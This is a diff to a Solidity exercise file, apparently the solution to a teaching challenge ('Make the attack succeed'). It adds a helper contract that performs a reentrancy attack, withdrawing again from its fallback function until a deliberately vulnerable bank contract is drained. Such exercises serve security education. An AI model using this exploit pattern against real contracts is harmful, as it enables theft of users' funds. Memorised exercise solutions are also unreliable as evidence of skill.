@@ -23,19 +23,30 @@ interface IDumbBank {
     function withdraw(uint256 amount) external;
 }
 
-// This attack fails. Make the attack succeed.
-contract BankRobber {
+contract BankRobberHellper {
     IDumbBank dumbBank;
 
     constructor(IDumbBank _dumbBank) payable {
         dumbBank = _dumbBank;
-        _dumbBank.deposit{value: 1 ether}();
-        _dumbBank.withdraw(1 ether);
+    }
+
+    function attack() external payable {
+        dumbBank.deposit{value: 1 ether}();
+        dumbBank.withdraw(1 ether);
     }
 
     fallback() external payable {
-        if (address(dumbBank).balance > 1 ether) {
+        if (address(dumbBank).balance >= 1 ether) {
             dumbBank.withdraw(1 ether);
         }
+    }
+}
+
+// This attack fails. Make the attack succeed.
+contract BankRobber {
+    constructor(IDumbBank _dumbBank) payable {
+        BankRobberHellper helper = new BankRobberHellper(_dumbBank);
+
+        helper.attack{value: msg.value}();
     }
 }
